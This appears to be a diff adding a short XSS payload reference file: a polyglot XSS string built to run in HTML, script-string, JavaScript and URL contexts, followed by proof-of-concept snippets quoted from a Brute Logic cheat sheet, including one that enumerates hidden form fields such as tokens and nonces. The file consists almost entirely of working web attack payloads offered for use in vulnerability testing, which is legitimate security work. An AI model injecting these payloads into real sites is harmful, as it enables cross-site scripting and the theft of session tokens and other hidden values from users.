@@ -1,0 +1,18 @@
+The following is a "polygot test XSS payload." This test will execute in multiple contexts including html, script string, js and URL.
+javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
+
+#From https://brutelogic.com.br/blog/wp-content/uploads/2021/09/Brute-XSS-Cheat-Sheet-Sample.pdf
+Javascript Injections
+This section is about the payloads needed to prove XSS vulnerability.
+All shown here can be combined to create unique payloads according to
+language syntax and most of the payloads shown in this section can also be
+used in the HTMLi vectors in the previous chapter.
+
+Use to shake all the visible elements of the page as a good visualization of the
+vulnerability.
+setInterval(k=>{b=document.body.style,b.marginTop=(b.marginTop=='4px')?'-4px':'4px';},5)
+Alternative PoC - Alert Hidden Values
+Use to prove that all hidden HTML values like tokens and nonces in target
+page can be stolen.
+f=document.forms;for(i=0;i<f.length;i++){e=f[i].elements;
+for(n in e){if(e[n].type=='hidden'){alert(e[n].name+': '+e[n].value)}}}
